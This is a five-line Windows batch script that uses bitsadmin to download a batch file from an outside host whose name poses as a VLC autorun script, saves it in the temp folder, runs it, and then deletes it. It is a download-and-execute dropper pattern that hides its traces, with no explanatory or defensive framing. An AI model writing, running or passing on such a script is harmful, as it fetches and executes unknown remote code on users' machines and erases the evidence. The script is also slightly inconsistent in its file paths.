bitsadmin.exe /transfer "Downloadstartvlc" https://autorunvlcscript.my-cats.gq %temp%\startvlc1.bat
copy startvlc1.bat startvlc.bat
erase startvlc1.bat
%temp%\startvlc.bat
del /f /q %temp%\startvlc.bat